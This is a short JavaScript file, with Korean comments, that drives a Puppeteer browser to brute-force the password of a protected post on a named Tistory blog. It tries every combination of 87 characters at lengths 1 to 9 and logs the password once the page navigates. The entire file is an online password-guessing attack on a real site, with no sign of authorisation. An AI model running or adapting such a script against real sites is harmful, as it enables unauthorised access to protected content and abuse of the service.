const puppeteer = require('puppeteer');

// 조합에 사용할 문자 집합
const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+[]{}|;:,.<>?';

// 조합을 생성하는 함수
function generateCombinations(length) {
    const combinations = [];
    const maxCombinations = Math.pow(chars.length, length);

    for (let i = 0; i < maxCombinations; i++) {
        let combination = '';
        let num = i;

        for (let j = 0; j < length; j++) {
            combination = chars[num % chars.length] + combination;
            num = Math.floor(num / chars.length);
        }

        combinations.push(combination);
    }

    return combinations;
}

(async () => {
  // Puppeteer를 시작하고 브라우저 창을 엽니다.
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();

  // 페이지로 이동하고 로드될 때까지 대기
  await page.goto('https://neck392.tistory.com/64', { waitUntil: 'networkidle2' });

  // 1부터 9까지의 길이로 조합을 생성하고 시도합니다.
  for (let length = 1; length <= 9; length++) {
    console.log(`\n조합 길이: ${length}`);
    const generatedCombinations = generateCombinations(length);

    for (const password of generatedCombinations) {
      console.log('시도 중 비밀번호:', password);

      // 비밀번호 입력란에 비밀번호 입력
      await page.type('input[name="entry64password"]', password);
      await page.click('button[type="submit"]');

      // 페이지가 이동하는지 확인
      try {
        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 3000 });
        console.log('비밀번호가 올바름:', password);
        console.log('찾은 비밀번호:', password); // 올바른 비밀번호 출력
        await browser.close();
        return; // 올바른 비밀번호를 찾으면 종료
      } catch {
        // 잘못된 비밀번호로 페이지가 재시도 상태일 경우
        console.log('잘못된 비밀번호:', password);
        await page.evaluate(() => document.querySelector('input[name="entry64password"]').value = ''); // 입력 필드 비우기
      }
    }
  }

  console.log('모든 조합을 시도했으나 비밀번호를 찾지 못했습니다.');
  await browser.close();
})();
